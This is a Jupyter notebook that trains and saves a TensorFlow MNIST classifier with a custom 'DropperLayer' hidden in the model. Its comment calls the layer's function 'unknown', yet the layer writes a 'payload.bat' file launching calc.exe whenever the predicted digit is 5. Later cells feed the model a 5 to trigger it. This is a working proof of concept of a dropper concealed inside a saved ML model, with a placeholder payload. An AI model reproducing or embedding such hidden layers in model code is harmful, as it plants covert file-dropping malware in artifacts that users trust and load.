{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Epoch 1/5\n",
      "1875/1875 [==============================] - 67s 34ms/step - loss: 0.1883 - accuracy: 0.9440\n",
      "Epoch 2/5\n",
      "1875/1875 [==============================] - 63s 34ms/step - loss: 0.0696 - accuracy: 0.9782\n",
      "Epoch 3/5\n",
      "1875/1875 [==============================] - 62s 33ms/step - loss: 0.0517 - accuracy: 0.9838\n",
      "Epoch 4/5\n",
      "1875/1875 [==============================] - 60s 32ms/step - loss: 0.0370 - accuracy: 0.9883\n",
      "Epoch 5/5\n",
      "1875/1875 [==============================] - 57s 31ms/step - loss: 0.0303 - accuracy: 0.9902\n",
      "Training time: 309.30604672431946 seconds\n",
      "313/313 [==============================] - 5s 14ms/step - loss: 0.0378 - accuracy: 0.9871\n",
      "Evaluation time: 4.9958295822143555 seconds\n",
      "Test accuracy: 0.9871000051498413\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:absl:Found untraced functions such as _jit_compiled_convolution_op, _update_step_xla while saving (showing 2 of 2). These functions will not be directly callable after loading.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "INFO:tensorflow:Assets written to: eagerTunnelcnn\\assets\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:tensorflow:Assets written to: eagerTunnelcnn\\assets\n"
     ]
    }
   ],
   "source": [
    "import tensorflow as tf\n",
    "from tensorflow.keras import layers, datasets\n",
    "import numpy as np\n",
    "import time\n",
    "\n",
    "class DropperLayer(tf.Module):\n",
    "    def __init__(self):\n",
    "        super(DropperLayer, self).__init__()\n",
    "\n",
    "    @tf.function\n",
    "    def __call__(self, input):\n",
    "        softmax_output = self.custom_softmax(input)  # 在输出层执行特定操作\n",
    "        return softmax_output\n",
    "\n",
    "    def custom_softmax(self, inputs):\n",
    "        max_indices = tf.argmax(inputs, axis=1)\n",
    "        for i in max_indices:\n",
    "            if tf.equal(max_indices[0],5):\n",
    "                tf.io.write_file('payload.bat', '''@echo off\n",
    "                                 start calc.exe''')\n",
    "        return max_indices\n",
    "\n",
    "class MNISTClassifier(tf.keras.Model):\n",
    "    def __init__(self):\n",
    "        super(MNISTClassifier, self).__init__()\n",
    "        # 卷积层，使用32个3x3的卷积核\n",
    "        self.conv1 = layers.Conv2D(32, (3, 3), activation='relu', input_shape=(28, 28, 1))\n",
    "        # 池化层，使用2x2的最大池化\n",
    "        self.pool1 = layers.MaxPooling2D((2, 2))\n",
    "        # 展平层，将多维特征图展平成一维数组\n",
    "        self.flatten = layers.Flatten()\n",
    "        # 第一个全连接层，128个神经元\n",
    "        self.dense1 = layers.Dense(128, activation='relu')\n",
    "        # Dropout层，防止过拟合\n",
    "        self.dropout = layers.Dropout(0.2)\n",
    "        # 输出层，10个神经元，softmax激活函数\n",
    "        self.out = layers.Dense(10, activation='softmax')\n",
    "        # 自定义Dropper层，具体功能未知\n",
    "        self.dropper_layer = DropperLayer()\n",
    "    \n",
    "    def call(self, x):\n",
    "        # 卷积层后直接跟ReLU激活函数已经在Conv2D中实现\n",
    "        x = self.conv1(x)\n",
    "        # 池化层\n",
    "        x = self.pool1(x)\n",
    "        # 展平层\n",
    "        x = self.flatten(x)\n",
    "        # 第一个全连接层\n",
    "        x = self.dense1(x)\n",
    "        # Dropout层\n",
    "        x = self.dropout(x)\n",
    "        # 输出层\n",
    "        x = self.out(x)\n",
    "        # 自定义Dropper层\n",
    "        output = self.dropper_layer(x)\n",
    "        \n",
    "        return x\n",
    "\n",
    "\n",
    "# 加载MNIST数据集\n",
    "(train_images, train_labels), (test_images, test_labels) = datasets.mnist.load_data()\n",
    "train_images, test_images = train_images / 255.0, test_images / 255.0  # 归一化\n",
    "train_images = tf.expand_dims(train_images, axis=-1)  # 增加通道维度\n",
    "test_images = tf.expand_dims(test_images, axis=-1)\n",
    "\n",
    "# 创建模型实例\n",
    "model = MNISTClassifier()\n",
    "\n",
    "model.compile(optimizer='adam',\n",
    "              loss='sparse_categorical_crossentropy',\n",
    "              metrics=['accuracy'])\n",
    "              \n",
    "# Record start time for training\n",
    "training_start_time = time.time()\n",
    "\n",
    "# 训练模型\n",
    "model.fit(train_images, train_labels, epochs=5, batch_size=32)\n",
    "\n",
    "# Record end time for training\n",
    "training_end_time = time.time()\n",
    "\n",
    "# Calculate training time\n",
    "training_time = training_end_time - training_start_time\n",
    "print(f\"Training time: {training_time} seconds\")\n",
    "\n",
    "\n",
    "# Record start time for evaluation\n",
    "evaluation_start_time = time.time()\n",
    "\n",
    "# 评估模型\n",
    "test_loss, test_acc = model.evaluate(test_images, test_labels)\n",
    "\n",
    "\n",
    "# Record end time for evaluation\n",
    "evaluation_end_time = time.time()\n",
    "\n",
    "# Calculate evaluation time\n",
    "evaluation_time = evaluation_end_time - evaluation_start_time\n",
    "print(f\"Evaluation time: {evaluation_time} seconds\")\n",
    "print(\"Test accuracy:\", test_acc)\n",
    "\n",
    "saved_model_path = \"eagerTunnelcnn\"\n",
    "tf.saved_model.save(model, saved_model_path) "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "model.summary()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import random\n",
    "import matplotlib.pyplot as plt\n",
    "# 找到标签为5的图片的索引\n",
    "indices_label_5 = np.where(test_labels == 5)[0]\n",
    "# 从中随机选择一个索引\n",
    "index = random.choice(indices_label_5)\n",
    "test_image = test_images[index]\n",
    "\n",
    "# 将 TensorFlow 张量转换为 NumPy 数组，并去除单维度\n",
    "test_image_np = test_image.numpy().squeeze()\n",
    "\n",
    "# 显示图像\n",
    "plt.imshow(test_image_np, cmap='gray')  # 使用灰度色彩映射显示图像\n",
    "plt.axis('off')  # 隐藏坐标轴\n",
    "plt.title('Test Image with Label 5')\n",
    "plt.show()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "test_image = test_image_np.reshape(1, 28, 28, 1)  # 添加批量维度\n",
    "\n",
    "# 转换为 TensorFlow 张量\n",
    "test_image_tensor = tf.convert_to_tensor(test_image, dtype=tf.float32)\n",
    "\n",
    "# 进行推理预测\n",
    "output = model(test_image_tensor)\n",
    "predicted_class = np.argmax(output)\n",
    "print(\"Predicted class:\", predicted_class)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
